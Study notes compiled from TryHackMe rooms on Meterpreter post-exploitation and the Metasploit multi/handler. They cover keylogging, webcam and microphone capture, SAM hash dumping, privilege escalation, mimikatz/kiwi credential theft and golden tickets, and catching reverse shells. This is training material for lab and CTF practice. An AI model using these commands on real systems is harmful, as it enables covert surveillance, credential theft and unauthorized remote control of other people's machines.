getuid: Shows the user that Meterpreter is running as
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu)
---------------------------------------------------------------------------------------
idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database

Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.
-----------------------------------------------------------------------------------------------------------------------------------------------------
From: https://tryhackme.com/room/meterpreter [with some edits and rephrasing]; task 4
Post-Exploitation with Meterpreter
----------------------------------
Meterpreter provides you with many useful commands that facilitate the post-exploitation phase.
Below are a few examples you will often use:

Help
-----
This command will give you a list of all available commands in Meterpreter. As we have seen earlier, Meterpreter has many versions, and each version may have different options available. Typing 'help' once you have a Meterpreter session will help you quickly browse through available commands.

Meterpreter commands
--------------------
The 'getuid' command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)

The 'ps' command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.

Migrate
--------
Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the 'keyscan_start', 'keyscan_stop', and 'keyscan_dump' command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.
To migrate to any process, you need to type the 'migrate' command followed by the PID of the desired target process.
The example below shows Meterpreter migrating to process ID 716:

meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.

Hashdump
---------
The 'hashdump' command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.
Ex.: meterpreter > hashdump
While it is not mathematically possible to "crack" these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.

Search
------
The 'search' command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.
Ex.: meterpreter > search -f flag2.txt

Shell
-----
The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.
Ex.: 
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
--------------------------------------------------------------------------------------------------------------------------------------
From: https://tryhackme.com/room/meterpreter [with some edits and rephrasing]; task 5

Meterpreter provides several important post-exploitation tools.

Commands mentioned previously, such as 'getsystem' and 'hashdump' will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.
Ex.:
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!

meterpreter >
-----------------------
The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.

* Gathering further information about the target system.
* Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
* Privilege escalation.
* Lateral movement.
Once any additional tool is loaded using the 'load' command, you will see new options on the help menu.

Ex.:
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

These will change according to the loaded menu, so running the 'help' command after loading a module is always a good idea.
The updated help menu after loading kiwi:

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
From: https://tryhackme.com/room/introtoshells ; Task 10 [with some edits and rephrasing]

Metasploit multi/handler
------------------------
Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

Fortunately, it's relatively easy to use:

Open Metasploit with:

msfconsole

Type:

use multi/handler

and press enter
We are now primed to start a multi/handler session. [You can now] take a look at the available options using the options command.

There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with ... We set these options with the following commands:

set PAYLOAD <payload>
set LHOST <listen-address>
set LPORT <listen-port>

We should now be ready to start the listener!

Let's do this by using the
exploit -j
command. This tells Metasploit to launch the module, running as a job in the background.

[Note: to have Metasploit listen] on a port under 1024 ... Metasploit must be run with sudo permissions.

When the staged payload [discussed in Task 9] is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell.

Notice that, because the multi/handler was originally backgrounded, we needed to use:
sessions 1
to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions <number> to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "Command Shell session 1 opened").
